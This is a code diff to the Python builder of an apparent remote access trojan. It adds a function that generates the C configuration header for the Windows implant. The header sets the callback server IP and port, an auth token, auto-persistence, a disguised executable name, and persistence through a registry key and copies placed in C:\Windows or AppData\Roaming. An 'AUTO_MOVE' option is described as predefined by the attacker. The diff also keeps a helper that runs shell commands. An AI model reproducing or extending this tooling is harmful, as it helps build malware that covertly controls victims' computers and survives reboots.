@@ -19,7 +19,7 @@ SPLIT = "|SPLIT|"
 #session, False, ip,port, is_he_alive, is_he_admin, path_rat, usename, token
 
 def exec(command):
-    with Popen([str(command)], stdout=PIPE,stderr=PIPE,shell=True) as cmd:
+    with Popen(str(command), stdout=PIPE,stderr=PIPE,shell=True) as cmd:
         out,err = str(cmd.stdout.read(),"UTF8",errors="ignore"),str(cmd.stderr.read(),"UTF8",errors="ignore")
         if not err:
             print(out)
@@ -55,6 +55,8 @@ def printColor(status,message):
     TERMINAL_COLOR = "\033[34m" #blue
     INFO_COLOR =  "\033[33m"
     ARRAY_COLOR = "\033[36m" #cayen
+    SUCCESSFULLY_COLOR = "\033[32m"
+
     RESET_COLOR = Style.RESET_ALL
 
     if status == "error":
@@ -63,7 +65,8 @@ def printColor(status,message):
         print(INFO_COLOR+message+TERMINAL_COLOR)
     elif status == "help":
         print(HELP_COLOR+message+TERMINAL_COLOR)
-
+    elif status == "successfully":
+        print(SUCCESSFULLY_COLOR+message+TERMINAL_COLOR)
 
 def myBanner():
     myvar = """
@@ -110,26 +113,31 @@ def myBanner():
 
 def commonHeader():
     header = """
-
 #ifndef COMMON_H
 #define COMMON_H
-//#pragma once
-
+//default header
 #define BUFFER_LEN 4096
 
 //Change everything according to your wishes:
 #define IP_ADDRESS "192.168.0.98" //Ip of server
 #define PORT 8888 //Port of server
+#define AUTO_PERSISTENCE false
 #define TIMEOUT 3000//2 seconds for reconnect to server during a disconnection
-#define TIMEOUT_SOCK 3
-#define SLEEP_RECV 200 // allows to delay in order to avoid bugs
+#define TOKEN "|GENERATE_TOKEN|" //the token
 #define NAME_PROG "12.exe" //Name of prog
-#define PATH_ADMIN "C:\\Windows" //Persistence path if the client is running admin mode.
-#define PATH_NOT_ADMIN "C:\\Users\\$USER\\AppData\\Roaming"
-#define TIMEOUT_POPEN 7 
-//#define PATH_NOT_ADMIN "C:\\Users\\$USER\\AppData\\Roaming\\Wireshark"
-#define NAME_KEY_REGISTER  "tazamail"
 
+#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
+#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
+#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
+
+//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
+// DO NOT TOUCH:
+
+#define BUFFER_LEN 4096
+#define TIMEOUT_SOCK 5 // DO NOT TOUCH 
+#define SLEEP_RECV 200 // DO NOT TOUCH 
+#define TIMEOUT_POPEN 7 // DO NOT TOUCH
+#define NAME_KEY_REGISTER  "tazamail" // DO NOT TOUCH
 #define SPLIT "|SPLIT|" 
 
 #endif
@@ -138,3 +146,41 @@ def commonHeader():
 $USER is changed by the user who executed the program.
 */
 """
+    return header
+
+def customHeader(ip, auto, port, reco, name, token): 
+    #In order not to have an error you need 4 \.
+    #Example C:\ = C:\\\\
+    header = """
+#ifndef COMMON_H
+#define COMMON_H
+
+#define BUFFER_LEN 4096
+
+//Change everything according to your wishes:
+#define IP_ADDRESS "{}" //Ip of server
+#define PORT {} //Port of server
+#define AUTO_PERSISTENCE {}
+#define TIMEOUT {} //2 seconds for reconnect to server during a disconnection
+#define NAME_PROG "{}" //Name of prog
+#define TOKEN "{}"
+
+#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
+#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
+#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
+
+//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
+// DO NOT TOUCH:
+
+#define TIMEOUT_SOCK 5 // DO NOT TOUCH 
+#define SLEEP_RECV 200 // DO NOT TOUCH 
+#define TIMEOUT_POPEN 7 // DO NOT TOUCH
+#define NAME_KEY_REGISTER  "tazamail" // DO NOT TOUCH
+#define SPLIT "|SPLIT|" 
+
+
+#endif
+
+""".format(ip, port, auto, reco, name,token)
+
+    return header
